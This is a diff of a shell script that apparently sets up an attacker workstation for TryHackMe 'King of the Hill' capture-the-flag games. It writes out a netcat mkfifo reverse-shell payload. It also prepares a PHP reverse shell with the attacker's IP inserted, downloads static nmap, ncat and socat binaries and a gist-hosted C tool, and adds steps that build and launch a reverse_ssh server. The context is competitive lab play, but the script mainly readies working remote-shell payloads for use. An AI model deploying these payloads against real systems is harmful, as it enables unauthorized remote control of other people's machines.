@@ -26,17 +26,23 @@ echo "static binary (ncat, nmap, socat) download scripts"
 echo "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap && wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat && wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" > get-static-binaries.sh
 chmod +x get-static-binaries.sh
 
-echo "nc rev payload as nc-rev.txt:"
+echo "nc rev payload as nc-rev.txt"
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(hostname -i) 4444 >/tmp/f" > nc-rev.txt
-echo "php rev as reverse.php:"
+echo "php rev as reverse.php"
 cp /usr/share/webshells/php/php-reverse-shell.php ./reverse.php && sed -i "s/PUT_THM_ATTACKBOX_IP_HERE/$(hostname -i)/g" reverse.php && sed -i "s/1234/4444/g" reverse.php
 
 echo "chattr alternative for koth (mf.c and mf)"
 wget -q https://gist.githubusercontent.com/ChrisPritchard/05d98e1d195bc255b30674c8ce0fec50/raw/44b4079a5317820db6789b90a0c6d0dfb2330609/mf.c -O mf.c && gcc -static -o mf mf.c
 
-echo "creating ssh key"
 ssh-keygen -t ed25519 -P "" -f "/root/.ssh/id_ed25519" > /dev/null
-echo "public key is:"
+echo "ssh public key is:"
 cat .ssh/id_ed25519.pub
+
+echo "update-go.sh script"
+echo "wget -q https://go.dev/dl/go1.18.linux-amd64.tar.gz && rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.linux-amd64.tar.gz && rm go1.18.linux-amd64.tar.gz" > update-go.sh
+chmod +x update-go.sh
+
+echo "reverse_ssh setup"
+echo "git clone https://github.com/NHAS/reverse_ssh && cd reverse_ssh && make && cd bin/ && cp ~/.ssh/id_ed25519.pub authorized_keys && ./server 0.0.0.0:3232"
 
 echo "ready!"
